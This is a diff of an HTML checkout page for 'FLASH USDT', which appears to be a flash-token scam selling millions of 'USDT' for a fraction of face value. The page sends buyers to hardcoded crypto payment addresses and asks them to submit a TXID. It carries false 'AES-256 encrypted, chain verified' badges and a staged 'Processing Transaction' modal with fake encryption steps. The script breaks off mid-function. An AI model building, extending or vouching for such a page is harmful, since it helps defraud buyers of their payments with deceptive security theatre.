@@ -4,13 +4,13 @@
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>FLASH USDT — ERC20 Checkout (AES Secure)</title>
-<meta name="description" content="FLASH USDT ERC20 packages — AES-secure Ethereum checkout, instant settlement, professional design." />
+<meta name="description" content="FLASH USDT ERC20 packages — AES-secure, instant settlement, professional checkout." />
 <link rel="icon" type="image/png" href="assets/USDT-2.png" />
 <style>
   :root{
     --bg1:#0a081a; --bg2:#13142e; --bg3:#1b1f45;
     --text:#eef3ff; --muted:#9aa0c2;
-    --cyan:#7aa2ff; --vio:#8a2cff; --lime:#16d18a; --amber:#ffcc4d;
+    --cyan:#7aa2ff; --vio:#8a2cff; --rose:#ff4b9f; --lime:#16d18a; --amber:#ffcc4d;
     --border:rgba(255,255,255,.12); --glass:rgba(255,255,255,.06);
   }
   *{box-sizing:border-box}
@@ -20,11 +20,22 @@
     color:var(--text);
     background:
       radial-gradient(1200px 700px at 10% -10%, rgba(122,162,255,.12), transparent 55%),
-      radial-gradient(900px 500px at 90% 0, rgba(138,44,255,.15), transparent 60%),
+      radial-gradient(900px 500px at 90% 0, rgba(138,44,255,.18), transparent 60%),
       linear-gradient(180deg, var(--bg1), var(--bg2) 50%, var(--bg3));
-    overflow-x:hidden; display:flex; flex-direction:column;
+    overflow-x:hidden;
+    display:flex; flex-direction:column;
   }
 
+  /* Subtle AES background grid */
+  .aes-bg{
+    position:fixed; inset:0; pointer-events:none; z-index:0; opacity:.08;
+    background:
+      repeating-linear-gradient(90deg, rgba(255,255,255,.05) 0 1px, transparent 1px 80px),
+      repeating-linear-gradient(0deg, rgba(255,255,255,.04) 0 1px, transparent 1px 80px);
+    mask: radial-gradient(ellipse at 50% 10%, #000 35%, transparent 70%);
+  }
+
+  /* Header */
   header{position:sticky;top:0;z-index:50;background:rgba(10,15,40,.75);backdrop-filter:blur(16px);border-bottom:1px solid var(--border)}
   .nav{max-width:1200px;margin:0 auto;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;gap:12px}
   .brand{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.4px}
@@ -33,90 +44,184 @@
   .menu{display:flex;gap:16px}
   .menu a{color:var(--muted);text-decoration:none;font-weight:600}
   .menu a:hover{color:var(--cyan)}
-  .btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:10px 14px;border-radius:12px;font-weight:700;
-    background:linear-gradient(90deg,#7aa2ff,#8a2cff);color:#fff;text-decoration:none;box-shadow:0 10px 22px rgba(0,0,0,.25);transition:.2s;border:none}
+  .btn{
+    display:inline-flex;align-items:center;justify-content:center;gap:8px;
+    padding:10px 14px;border-radius:12px;font-weight:700;
+    background:linear-gradient(90deg,#7aa2ff,#8a2cff);color:#fff;text-decoration:none;
+    box-shadow:0 10px 22px rgba(0,0,0,.25);transition:.2s;border:none
+  }
   .btn:hover{transform:translateY(-2px);opacity:.95}
   .ghost{background:transparent;border:1px solid var(--border);color:#d5dcff}
+  .ghost:hover{border-color:#7aa2ff}
   .primary{background:linear-gradient(90deg,#7aa2ff,#8a2cff);border:none}
 
-  .hero{text-align:center;padding:64px 20px 10px;z-index:1}
-  .hero h1{margin:0 0 8px;font-size:clamp(30px,5.5vw,44px);font-weight:900;background:linear-gradient(90deg,#cfe8ff,#9aa8ff);
-    -webkit-background-clip:text;background-clip:text;color:transparent;text-shadow:0 0 18px rgba(122,162,255,.15);}
+  /* Hero */
+  .hero{position:relative; text-align:center; padding:64px 20px 10px; z-index:1}
+  .hero h1{
+    margin:0 0 8px;
+    font-size:clamp(30px,5.5vw,44px);
+    font-weight:900; letter-spacing:.5px;
+    background:linear-gradient(90deg,#cfe8ff,#9aa8ff);
+    -webkit-background-clip:text; background-clip:text; color:transparent;
+    text-shadow:0 0 18px rgba(122,162,255,.15);
+  }
   .hero p{max-width:880px;margin:8px auto 22px;color:#c5cdf2;line-height:1.7}
+  .hero .btn{margin-top:4px}
 
-  main{position:relative;z-index:1;flex:1}
+  /* Main layout */
+  main{position:relative;z-index:1; flex:1}
   .wrap{max-width:1200px;margin:0 auto;padding:0 20px}
-  .stage{min-height:calc(100vh - 260px);display:grid;gap:24px;grid-template-columns:minmax(0,1fr);align-items:start;justify-items:center;transition:grid-template-columns .35s ease}
+  .stage{
+    min-height: calc(100vh - 260px);
+    display:grid; gap:24px;
+    grid-template-columns: minmax(0,1fr);
+    align-items:start; justify-items:center;
+    transition:grid-template-columns .35s ease;
+  }
   .stage.with-summary{grid-template-columns:minmax(0,1fr) 380px}
 
-  .card,.panel,.summary{position:relative;border-radius:18px;overflow:hidden;background:rgba(255,255,255,.045);border:1px solid var(--border);
-    backdrop-filter:blur(14px);box-shadow:0 10px 30px rgba(0,0,0,.25)}
+  /* Common cards (no rainbow ring) */
+  .card,.panel,.summary{
+    position:relative;border-radius:18px;overflow:hidden;
+    background:rgba(255,255,255,.045);border:1px solid var(--border);backdrop-filter:blur(14px);
+    box-shadow:0 10px 30px rgba(0,0,0,.25), inset 0 0 0 1px rgba(255,255,255,.02);
+  }
   .pad{padding:20px}
 
-  .title{text-align:center;margin:0 0 6px;font-size:clamp(24px,3.5vw,28px)}
+  /* Section headings */
+  .title{margin:0 0 6px;font-size:clamp(24px,3.5vw,28px);text-align:center}
   .sub{color:var(--muted);margin:2px 0 12px;text-align:center}
 
-  .products{max-width:1040px;margin:10px auto 6px;display:grid;gap:18px;grid-template-columns:repeat(auto-fit,minmax(230px,1fr))}
-  .product{position:relative;padding:18px;text-align:center;transition:.25s;outline:1px solid rgba(255,255,255,.06)}
+  /* Products */
+  .products{
+    max-width:1040px; margin:10px auto 6px;
+    display:grid; gap:18px;
+    grid-template-columns:repeat(auto-fit,minmax(230px,1fr));
+  }
+  .product{
+    position:relative; padding:18px; text-align:center; transition:.25s; overflow:hidden;
+    outline:1px solid rgba(255,255,255,.06);
+  }
   .product:hover{transform:translateY(-6px);box-shadow:0 30px 70px rgba(122,162,255,.1)}
   .product h4{margin:6px 0 6px;font-size:18px}
   .price{font-weight:800;font-size:22px;color:var(--cyan);margin-bottom:6px}
   .amount{font-size:13px;color:#cbd2ff}
-  .security-badge{display:inline-flex;align-items:center;gap:8px;font-weight:800;font-size:11px;padding:6px 10px;border-radius:999px;
-    border:1px solid var(--border);background:rgba(255,255,255,.05);color:#9ee7ff;margin-bottom:10px;}
-  .tape{position:absolute;left:-40%;right:-40%;top:10px;height:22px;display:flex;align-items:center;justify-content:center;gap:18px;
-    letter-spacing:.8px;font-size:11px;font-weight:800;color:#7fe9ff;background:linear-gradient(90deg,rgba(122,162,255,.12),rgba(138,44,255,.12));
-    border-top:1px solid rgba(255,255,255,.1);border-bottom:1px solid rgba(255,255,255,.1);transform:rotate(-3deg);animation:tapeMove 10s linear infinite;}
-  @keyframes tapeMove{0%{transform:translateX(0) rotate(-3deg)}100%{transform:translateX(18%) rotate(-3deg)}}
-  .micro{margin-top:10px;display:flex;justify-content:center;gap:10px;flex-wrap:wrap;font-size:11px;color:#cfe0ff}
+  .chip{display:inline-flex;align-items:center;gap:6px;padding:4px 8px;border-radius:12px;border:1px solid var(--border);background:rgba(255,255,255,.04);font-size:12px;color:#cfd6ff}
+  .product .actions{margin-top:12px}
+
+  /* AES tape - üstte ve çarpmaz */
+  .tape{
+    position:absolute; left:-40%; right:-40%; top:10px;
+    height:22px; display:flex; align-items:center; justify-content:center;
+    gap:18px; letter-spacing:.8px; font-size:11px; font-weight:800; color:#7fe9ff;
+    background:linear-gradient(90deg, rgba(122,162,255,.14), rgba(138,44,255,.14));
+    border-top:1px solid rgba(255,255,255,.1); border-bottom:1px solid rgba(255,255,255,.1);
+    transform:rotate(-3deg);
+    animation:tapeMove 10s linear infinite;
+    text-shadow:0 0 10px rgba(122,162,255,.28);
+    pointer-events:none;
+  }
+  @keyframes tapeMove{ 0%{transform:translateX(0) rotate(-3deg)} 100%{transform:translateX(18%) rotate(-3deg)} }
+
+  .led-dot{
+    position:absolute; right:12px; bottom:12px; width:8px; height:8px; border-radius:50%;
+    background:radial-gradient(circle at 30% 30%, #65ffbf, #16d18a 60%, #0f513c 100%);
+    box-shadow:0 0 10px rgba(22,209,138,.7), 0 0 20px rgba(22,209,138,.3);
+    animation:blink 1.6s ease-in-out infinite;
+  }
+  @keyframes blink{ 0%,100%{opacity:.7; transform:scale(1)} 50%{opacity:1; transform:scale(1.25)} }
+  .security-badge{
+    display:inline-flex;align-items:center;gap:8px;font-weight:800;font-size:11px;
+    padding:6px 10px;border-radius:999px;border:1px solid var(--border);background:rgba(255,255,255,.05);
+    color:#9ee7ff; margin-bottom:10px;
+  }
+  .micro{margin-top:10px; display:flex; justify-content:center; gap:10px; flex-wrap:wrap; font-size:11px; color:#cfe0ff}
   .micro span{border:1px solid var(--border);padding:4px 8px;border-radius:999px;background:rgba(255,255,255,.04)}
 
+  /* Fields / methods */
   .field{display:flex;gap:10px;align-items:center;margin-top:12px}
-  input[type="text"]{flex:1;height:46px;border-radius:12px;border:1px solid var(--border);background:rgba(255,255,255,.04);color:var(--text);padding:0 12px;outline:none}
+  input[type="text"]{
+    flex:1;height:46px;border-radius:12px;border:1px solid var(--border);
+    background:rgba(255,255,255,.04);color:var(--text);padding:0 12px;outline:none
+  }
   input::placeholder{color:#9aa0c2}
   .actions{display:flex;justify-content:center;gap:10px;margin-top:16px;flex-wrap:wrap}
 
-  .methods{display:grid;gap:12px;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));max-width:860px;margin:10px auto 0}
-  .method{cursor:pointer;user-select:none;position:relative;display:flex;align-items:center;gap:12px;padding:14px;border-radius:14px;border:1px solid var(--border);
-    background:rgba(255,255,255,.03);transition:.2s}
+  .methods{
+    display:grid; gap:12px;
+    grid-template-columns:repeat(auto-fit,minmax(180px,1fr));
+    max-width:860px; margin:10px auto 0;
+  }
+  .method{
+    cursor:pointer; user-select:none; position:relative;
+    display:flex; align-items:center; gap:12px;
+    padding:14px; border-radius:14px; border:1px solid var(--border);
+    background:rgba(255,255,255,.03); transition:.2s
+  }
   .method img{width:24px;height:24px;object-fit:contain}
   .method.active{outline:2px solid rgba(122,162,255,.6);background:rgba(122,162,255,.08)}
-  .method.closed{opacity:.6;filter:saturate(.85) grayscale(.1)}
-  .method .badge-closed{position:absolute;top:6px;right:8px;background:#ff4b4b;color:#fff;font-weight:800;padding:2px 6px;font-size:10px;border-radius:6px}
+  .method.closed{opacity:.6; filter:saturate(.85) grayscale(.1)}
+  .method .badge-closed{
+    position:absolute; top:6px; right:8px;
+    background:#ff4b4b; color:#fff; font-weight:800;
+    padding:2px 6px; font-size:10px; border-radius:6px; letter-spacing:.3px;
+  }
 
   .row{display:flex;justify-content:space-between;gap:10px;color:#cfd6ff;font-size:14px;padding:8px 0;border-bottom:1px dashed rgba(255,255,255,.08)}
-  .small{font-size:12px;color:#aab2d8}
+  .row:last-child{border-bottom:none}
   .copy{cursor:pointer;border:1px solid var(--border);border-radius:10px;padding:6px 10px;background:rgba(255,255,255,.04)}
+  .small{font-size:12px;color:#aab2d8}
 
+  /* Summary */
   aside{display:none}
-  .stage.with-summary aside{display:block;position:sticky;top:88px;height:fit-content}
-  .summary .head{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:8px}
+  .stage.with-summary aside{display:block; position:sticky; top:88px; height:fit-content}
+  .summary .head{display:flex; align-items:center; justify-content:space-between; gap:10px; margin-bottom:8px}
   .summary .kvs{display:grid;gap:6px;margin-top:8px}
   .kv{display:flex;align-items:center;gap:10px;font-size:13px;color:#cfe0ff}
   .kv .k{min-width:120px;color:#93a7ff}
-  .summary .shield{display:inline-flex;align-items:center;gap:8px;font-weight:700;font-size:12px;padding:6px 10px;border-radius:999px;border:1px solid var(--border);
-    background:rgba(255,255,255,.04)}
+  .summary .shield{display:inline-flex;align-items:center;gap:8px;font-weight:700;font-size:12px;padding:6px 10px;border-radius:999px;border:1px solid var(--border);background:rgba(255,255,255,.04)}
   .slide-in{animation:slideIn .35s ease both}
   @keyframes slideIn{from{opacity:0;transform:translateX(10px)}to{opacity:1;transform:translateX(0)}}
 
-  footer{border-top:1px solid var(--border);background:linear-gradient(180deg,var(--bg2),var(--bg3));color:#a9b1c6}
+  /* Footer */
+  footer{border-top:1px solid var(--border); background:linear-gradient(180deg,var(--bg2),var(--bg3)); color:#a9b1c6}
   .foot{max-width:1200px;margin:0 auto;padding:22px 20px;display:flex;flex-wrap:wrap;gap:12px;justify-content:space-between;align-items:center}
   .foot-left{display:flex;align-items:center;gap:10px}
   .foot-left img{width:22px;height:22px;border-radius:6px}
 
-  .modal{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(3,6,21,.6);backdrop-filter:blur(6px);z-index:60}
-  .modal .box{width:min(520px,92vw);background:rgba(255,255,255,.06);border:1px solid var(--border);border-radius:16px;padding:20px;color:var(--text);
-    box-shadow:0 20px 80px rgba(0,0,0,.45);}
-  .aes-steps{display:flex;gap:10px;margin:14px 0 8px;flex-wrap:wrap}
-  .aes-step{flex:1;min-width:140px;border:1px dashed rgba(255,255,255,.16);border-radius:10px;padding:10px 12px;display:flex;align-items:center;gap:10px;opacity:.75}
-  .aes-step.active{border-style:solid;opacity:1;box-shadow:0 0 0 1px rgba(122,162,255,.22) inset}
-  .dot{width:10px;height:10px;border-radius:50%;background:#6272ff;box-shadow:0 0 12px rgba(98,114,255,.5)}
-  .aes-step.active .dot{background:#16d18a;box-shadow:0 0 12px rgba(22,209,138,.6)}
-  .code-line{font-family:monospace;font-size:12px;color:#b9c6ff;opacity:.88}
-  .modal .ok{display:none;margin-top:12px;text-align:center;font-weight:700;color:#9ef7cb}
+  /* AES MODAL */
+  .modal{position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(3,6,21,.6); backdrop-filter:blur(6px); z-index:60}
+  .modal .box{
+    width:min(520px, 92vw);
+    background:rgba(255,255,255,.06); border:1px solid var(--border); border-radius:16px; padding:20px; color:var(--text);
+    box-shadow:0 20px 80px rgba(0,0,0,.45);
+  }
+  .aes-steps{display:flex; gap:10px; margin:14px 0 8px; flex-wrap:wrap}
+  .aes-step{
+    flex:1; min-width:140px;
+    border:1px dashed rgba(255,255,255,.16); border-radius:10px; padding:10px 12px;
+    display:flex; align-items:center; gap:10px; opacity:.75
+  }
+  .aes-step.active{border-style:solid; opacity:1; box-shadow:0 0 0 1px rgba(122,162,255,.22) inset}
+  .dot{width:10px;height:10px;border-radius:50%; background:#6272ff; box-shadow:0 0 12px rgba(98,114,255,.5)}
+  .aes-step.active .dot{background:#16d18a; box-shadow:0 0 12px rgba(22,209,138,.6)}
+  .code-line{
+    font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+    font-size:12px; color:#b9c6ff; opacity:.88
+  }
+  .modal .ok{display:none; margin-top:12px; text-align:center; font-weight:700; color:#9ef7cb}
+
+  /* Responsive */
+  @media (max-width:960px){
+    .stage.with-summary{grid-template-columns:1fr}
+    aside{position:relative; top:auto}
+  }
 </style>
 </head>
 <body>
+<div class="aes-bg"></div>
+
+<!-- NAV -->
 <header>
   <div class="nav">
     <div class="brand"><img src="assets/logo.png" alt=""><div><span>FLASH</span> USDT</div></div>
@@ -125,89 +230,495 @@
       <a href="#steps">Checkout</a>
       <a href="#verify">TXID</a>
     </nav>
-    <a class="btn" href="#steps">Get Started</a>
+    <a class="btn" id="goStart" href="#steps">Get Started</a>
   </div>
 </header>
 
-<section class="hero">
+<!-- HERO -->
+<section class="hero" id="top">
   <h1>ERC20 Checkout — AES Secure</h1>
-  <p>Select your ERC20 plan, enter your wallet, choose a method, pay, and submit your TXID. Ethereum-based, AES-256 encrypted, verified chain delivery.</p>
+  <p>Select a package, enter your wallet, choose a method, pay, and submit your TXID. Low fees, confirmations in seconds, AES-256 security, 24/7 support.</p>
 </section>
 
+<!-- MAIN -->
 <main class="wrap" id="steps">
   <div class="stage" id="stage">
+    <!-- CENTER COLUMN -->
     <section style="width:100%;max-width:1120px">
-      <!-- STEP 1 -->
+      <!-- STEP 1: PRODUCTS -->
       <div class="card pad" id="step1">
         <h2 class="title">Select Your ERC20 Package</h2>
         <p class="sub">Ethereum network • AES-256 security • Chain verified</p>
+
         <div class="products">
+          <!-- PRODUCTS (görseldeki fiyatlarla) -->
           <article class="panel pad product" data-name="1K FLASH" data-usdt="1000" data-price="$280.00">
-            <div class="tape">AES256 ENCRYPTED • CHAIN VERIFIED • BLOCK HASH OK •</div>
-            <div class="security-badge">🔒 AES-256 SECURE</div><h4>1K FLASH</h4>
-            <div class="price">$280.00</div><div class="amount">Amount: 1,000 USDT</div>
+            <div class="tape">ENCRYPTED • AES256 • CHAIN VERIFIED • BLOCK HASH OK •</div>
+            <div class="security-badge">🔒 AES-256 SECURE</div>
+            <h4>1K FLASH</h4>
+            <div class="price">$280.00</div>
+            <div class="amount">Amount: 1,000 USDT</div>
             <div class="micro"><span>BlockTime ~12s</span><span>Verif. L2</span><span>Priority: Normal</span></div>
             <div class="actions"><button class="btn primary select">Select</button></div>
+            <div class="led-dot"></div>
           </article>
+
           <article class="panel pad product" data-name="10K FLASH" data-usdt="10000" data-price="$510.00">
-            <div class="tape">AES256 ENCRYPTED • CHAIN VERIFIED • BLOCK HASH OK •</div>
-            <div class="security-badge">🔒 AES-256 SECURE</div><h4>10K FLASH</h4>
-            <div class="price">$510.00</div><div class="amount">Amount: 10,000 USDT</div>
+            <div class="tape">ENCRYPTED • AES256 • CHAIN VERIFIED • BLOCK HASH OK •</div>
+            <div class="security-badge">🔒 AES-256 SECURE</div>
+            <h4>10K FLASH</h4>
+            <div class="price">$510.00</div>
+            <div class="amount">Amount: 10,000 USDT</div>
             <div class="micro"><span>BlockTime ~12s</span><span>Verif. L3</span><span>Priority: Fast</span></div>
             <div class="actions"><button class="btn primary select">Select</button></div>
+            <div class="led-dot"></div>
           </article>
+
           <article class="panel pad product" data-name="20K FLASH" data-usdt="20000" data-price="$780.00">
-            <div class="tape">AES256 ENCRYPTED • CHAIN VERIFIED • BLOCK HASH OK •</div>
-            <div class="security-badge">🔒 AES-256 SECURE</div><h4>20K FLASH</h4>
-            <div class="price">$780.00</div><div class="amount">Amount: 20,000 USDT</div>
+            <div class="tape">ENCRYPTED • AES256 • CHAIN VERIFIED • BLOCK HASH OK •</div>
+            <div class="security-badge">🔒 AES-256 SECURE</div>
+            <h4>20K FLASH</h4>
+            <div class="price">$780.00</div>
+            <div class="amount">Amount: 20,000 USDT</div>
             <div class="micro"><span>BlockTime ~12s</span><span>Verif. L3</span><span>Priority: Trader</span></div>
             <div class="actions"><button class="btn primary select">Select</button></div>
+            <div class="led-dot"></div>
           </article>
+
           <article class="panel pad product" data-name="50K FLASH" data-usdt="50000" data-price="$3,350.00">
-            <div class="tape">AES256 ENCRYPTED • CHAIN VERIFIED • BLOCK HASH OK •</div>
-            <div class="security-badge">🔒 AES-256 SECURE</div><h4>50K FLASH</h4>
-            <div class="price">$3,350.00</div><div class="amount">Amount: 50,000 USDT</div>
+            <div class="tape">ENCRYPTED • AES256 • CHAIN VERIFIED • BLOCK HASH OK •</div>
+            <div class="security-badge">🔒 AES-256 SECURE</div>
+            <h4>50K FLASH</h4>
+            <div class="price">$3,350.00</div>
+            <div class="amount">Amount: 50,000 USDT</div>
             <div class="micro"><span>BlockTime ~12s</span><span>Verif. L4</span><span>Priority: Business</span></div>
             <div class="actions"><button class="btn primary select">Select</button></div>
+            <div class="led-dot"></div>
           </article>
+
           <article class="panel pad product" data-name="100K FLASH" data-usdt="100000" data-price="$4,500.00">
-            <div class="tape">AES256 ENCRYPTED • CHAIN VERIFIED • BLOCK HASH OK •</div>
-            <div class="security-badge">🔒 AES-256 SECURE</div><h4>100K FLASH</h4>
-            <div class="price">$4,500.00</div><div class="amount">Amount: 100,000 USDT</div>
+            <div class="tape">ENCRYPTED • AES256 • CHAIN VERIFIED • BLOCK HASH OK •</div>
+            <div class="security-badge">🔒 AES-256 SECURE</div>
+            <h4>100K FLASH</h4>
+            <div class="price">$4,500.00</div>
+            <div class="amount">Amount: 100,000 USDT</div>
             <div class="micro"><span>BlockTime ~12s</span><span>Verif. L4</span><span>Priority: VIP</span></div>
             <div class="actions"><button class="btn primary select">Select</button></div>
+            <div class="led-dot"></div>
           </article>
+
           <article class="panel pad product" data-name="500K FLASH" data-usdt="500000" data-price="$14,500.00">
-            <div class="tape">AES256 ENCRYPTED • CHAIN VERIFIED • BLOCK HASH OK •</div>
-            <div class="security-badge">🔒 AES-256 SECURE</div><h4>500K FLASH</h4>
-            <div class="price">$14,500.00</div><div class="amount">Amount: 500,000 USDT</div>
+            <div class="tape">ENCRYPTED • AES256 • CHAIN VERIFIED • BLOCK HASH OK •</div>
+            <div class="security-badge">🔒 AES-256 SECURE</div>
+            <h4>500K FLASH</h4>
+            <div class="price">$14,500.00</div>
+            <div class="amount">Amount: 500,000 USDT</div>
             <div class="micro"><span>BlockTime ~12s</span><span>Verif. L5</span><span>Priority: Enterprise</span></div>
             <div class="actions"><button class="btn primary select">Select</button></div>
+            <div class="led-dot"></div>
           </article>
+
           <article class="panel pad product" data-name="1M FLASH" data-usdt="1000000" data-price="$22,500.00">
-            <div class="tape">AES256 ENCRYPTED • CHAIN VERIFIED • BLOCK HASH OK •</div>
-            <div class="security-badge">🔒 AES-256 SECURE</div><h4>1M FLASH</h4>
-            <div class="price">$22,500.00</div><div class="amount">Amount: 1,000,000 USDT</div>
+            <div class="tape">ENCRYPTED • AES256 • CHAIN VERIFIED • BLOCK HASH OK •</div>
+            <div class="security-badge">🔒 AES-256 SECURE</div>
+            <h4>1M FLASH</h4>
+            <div class="price">$22,500.00</div>
+            <div class="amount">Amount: 1,000,000 USDT</div>
             <div class="micro"><span>BlockTime ~12s</span><span>Verif. L5</span><span>Priority: Enterprise+</span></div>
             <div class="actions"><button class="btn primary select">Select</button></div>
+            <div class="led-dot"></div>
           </article>
         </div>
       </div>
 
-      <!-- WALLET / METHOD / PAYMENT / TXID  -->
-      <!-- (Aynı TRC20 kopyası burada devam ediyor, sadece network ERC20 olarak ayarlı) -->
-      <!-- Aynı kod yapısı korunacak şekilde buradan devam -->
+      <!-- STEP 2: WALLET -->
+      <div class="card pad" id="step2" style="display:none">
+        <h2 class="title">Enter Your Wallet Address</h2>
+        <p class="sub">Enter the recipient <b>ERC20</b> wallet (starts with <b>0x...</b>) where your package will be delivered.</p>
+        <div class="panel pad" style="margin-top:12px">
+          <div class="field">
+            <input type="text" id="wallet" placeholder="Your ERC20 wallet address (starts with 0x...)" />
+          </div>
+          <div class="small" style="margin-top:6px">Warning: Sending to a wrong address is irreversible.</div>
+        </div>
+        <div class="actions">
+          <button class="btn ghost" data-back>Back</button>
+          <button class="btn primary" data-next>Continue</button>
+        </div>
+      </div>
+
+      <!-- STEP 3: METHOD -->
+      <div class="card pad" id="step3" style="display:none">
+        <h2 class="title">Select Payment Method</h2>
+        <p class="sub">Choose a network or provider. Closed methods stay visible for clarity.</p>
+
+        <div class="methods">
+          <div class="method panel pad" data-method="TRC20">
+            <img src="assets/trc20.png" alt=""><div>TRC20 (TRON)</div>
+          </div>
+          <div class="method panel pad" data-method="ERC20">
+            <img src="assets/erc20.png" alt=""><div>ERC20 (Ethereum)</div>
+          </div>
+          <div class="method panel pad" data-method="BEP20">
+            <img src="assets/bep20.png" alt=""><div>BEP20 (BSC)</div>
+          </div>
+
+          <div class="method panel pad closed" data-closed="true">
+            <span class="badge-closed">CLOSED</span>
+            <img src="assets/btc.png" alt=""><div>BTC (Bitcoin)</div>
+          </div>
+          <div class="method panel pad closed" data-closed="true">
+            <span class="badge-closed">CLOSED</span>
+            <img src="assets/binance.png" alt=""><div>Binance Pay</div>
+          </div>
+          <div class="method panel pad closed" data-closed="true">
+            <span class="badge-closed">CLOSED</span>
+            <img src="assets/okx.png" alt=""><div>OKX Pay</div>
+          </div>
+        </div>
+
+        <div class="actions">
+          <button class="btn ghost" data-back>Back</button>
+          <button class="btn primary" data-next>Continue</button>
+        </div>
+      </div>
+
+      <!-- STEP 4: PAYMENT DETAILS -->
+      <div class="card pad" id="step4" style="display:none">
+        <h2 class="title">Payment Details</h2>
+        <p class="sub">Send the package amount to the address below using your selected network only.</p>
+
+        <div class="panel pad" style="margin-top:12px">
+          <div class="row"><div>Network</div><div id="sum-network">—</div></div>
+          <div class="row">
+            <div>Payment Address</div>
+            <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+              <span id="pay-address" class="small">—</span>
+              <button class="copy" id="copyAddr">Copy</button>
+            </div>
+          </div>
+          <div class="small" style="margin-top:8px">Use the same network you selected. Wrong-network transfers are not recoverable.</div>
+        </div>
+
+        <div class="actions">
+          <button class="btn ghost" data-back>Back</button>
+          <button class="btn primary" data-next>I've Made the Payment</button>
+        </div>
+      </div>
+
+      <!-- STEP 5: TXID -->
+      <div class="card pad" id="step5" style="display:none">
+        <h2 class="title">Submit Your TXID</h2>
+        <p class="sub">After sending, paste your <b>Transaction ID (TXID)</b> from the blockchain explorer.</p>
+
+        <div class="panel pad" style="margin-top:12px">
+          <div class="field">
+            <input type="text" id="txid" placeholder="Paste your TXID here" />
+          </div>
+          <div class="actions" style="margin-top:12px">
+            <button class="btn ghost" data-back>Back</button>
+            <button class="btn primary" id="sendTxid">Submit Transaction</button>
+          </div>
+          <div class="small" style="margin-top:8px">We do not collect personal data. Only TXID and necessary order info are sent.</div>
+        </div>
+      </div>
     </section>
+
+    <!-- RIGHT: SUMMARY -->
+    <aside id="sideSummary">
+      <div class="summary pad slide-in">
+        <div class="head">
+          <h3 style="margin:0">Order Summary</h3>
+          <span class="shield">🔐 AES-256 • Chain Verified</span>
+        </div>
+        <div class="kvs">
+          <div class="kv"><span class="k">Package</span> <span id="s-name">—</span></div>
+          <div class="kv"><span class="k">USDT Amount</span> <span id="s-amount">—</span></div>
+          <div class="kv"><span class="k">Price</span> <span id="s-price">—</span></div>
+          <div class="kv"><span class="k">Wallet</span> <span id="s-wallet">—</span></div>
+          <div class="kv"><span class="k">Network</span> <span id="s-network">—</span></div>
+          <div class="kv"><span class="k">Pay Address</span> <span id="s-address" class="small">—</span></div>
+          <div class="kv"><span class="k">Est. Fee</span> <span id="s-fee">~$3–$6 (ERC20)</span></div>
+          <div class="kv"><span class="k">ETA</span> <span>~12–60s confirmation</span></div>
+          <div class="kv"><span class="k">Timestamp</span> <span id="s-time">—</span></div>
+        </div>
+        <div class="actions" style="margin-top:14px">
+          <button class="btn ghost" id="changePlan">Change Plan</button>
+          <a class="btn primary" href="#step4" id="gotoPayment">Confirm Payment</a>
+        </div>
+      </div>
+    </aside>
   </div>
 </main>
 
+<!-- FOOTER -->
 <footer>
   <div class="foot">
-    <div class="foot-left"><img src="assets/USDT-2.png" alt=""><strong>FLASH USDT</strong> — AES-256 • Verified on Ethereum</div>
+    <div class="foot-left">
+      <img src="assets/USDT-2.png" alt="">
+      <strong>FLASH USDT</strong> — Encrypted by AES-256 • Verified on Ethereum
+    </div>
     <div>Contact: <a style="color:#cfe8ff" href="mailto:support@flashusdt.com">support@flashusdt.com</a></div>
     <div>© <span id="y"></span> FLASH USDT — ERC20</div>
   </div>
 </footer>
-<script>document.getElementById('y').textContent=new Date().getFullYear();</script>
+
+<!-- AES MODAL -->
+<div class="modal" id="aesModal" aria-hidden="true">
+  <div class="box">
+    <h3 style="margin:0 0 6px">Processing Transaction</h3>
+    <div class="small">AES-256 encryption & chain verification</div>
+
+    <div class="aes-steps" style="margin-top:12px">
+      <div class="aes-step" id="st1"><div class="dot"></div><div><strong>Encrypting</strong><div class="small">Sealing payload</div></div></div>
+      <div class="aes-step" id="st2"><div class="dot"></div><div><strong>Verifying</strong><div class="small">Confirming on-chain</div></div></div>
+      <div class="aes-step" id="st3"><div class="dot"></div><div><strong>Finalizing</strong><div class="small">Writing audit log</div></div></div>
+    </div>
+
+    <div class="code-line" id="codeLine">[AES] init…</div>
+    <div class="ok" id="okMsg">✅ Transaction Submitted. You can close this window.</div>
+
+    <div class="actions" style="margin-top:14px;justify-content:flex-end">
+      <button class="btn ghost" id="closeModal">Close</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  // Year
+  document.getElementById('y').textContent = new Date().getFullYear();
+
+  // CONFIG
+  const ADDRS = {
+    TRC20: "TXAk3cty1QpM72m9wRgQNwxBzEy3E9SyNU",
+    ERC20: "0xE88921A2d0315BF364a768c393D02cDF111A0Bc6",
+    BEP20: "0xE88921A2d0315BF364a768c393D02cDF111A0Bc6",
+    BTC: "" // closed
+  };
+  const EMAILJS = {
+    SERVICE_ID: "",   // e.g. service_xxx
+    TEMPLATE_ID: "",  // e.g. template_xxx
+    PUBLIC_KEY: ""    // e.g. AbC123...
+  };
+
+  // STATE
+  const state = {
+    productName: null,
+    productUSDT: null,
+    productPrice: null,
+    wallet: null,
+    network: null
+  };
+
+  const $ = sel => document.querySelector(sel);
+  const stage = $('#stage');
+  const steps = ["step1","step2","step3","step4","step5"];
+
+  // Navigation helpers
+  function showStep(id){
+    steps.forEach(s => {
+      const el = document.getElementById(s);
+      if(!el) return;
+      el.style.display = (s === id) ? 'block' : 'none';
+    });
+    window.scrollTo({top:0, behavior:"smooth"});
+  }
+  function toggleSummary(show){
+    if(show){ stage.classList.add('with-summary'); $('#s-time').textContent = new Date().toLocaleString(); }
+    else{ stage.classList.remove('with-summary'); }
+  }
+  function ADDRRSafe(net){ return ADDRS[net] || '—'; }
+
+  function updateSummary(){
+    $('#s-name').textContent   = state.productName || '—';
+    $('#s-amount').textContent = state.productUSDT ? `${Number(state.productUSDT).toLocaleString()} USDT` : '—';
+    $('#s-price').textContent  = state.productPrice || '—';
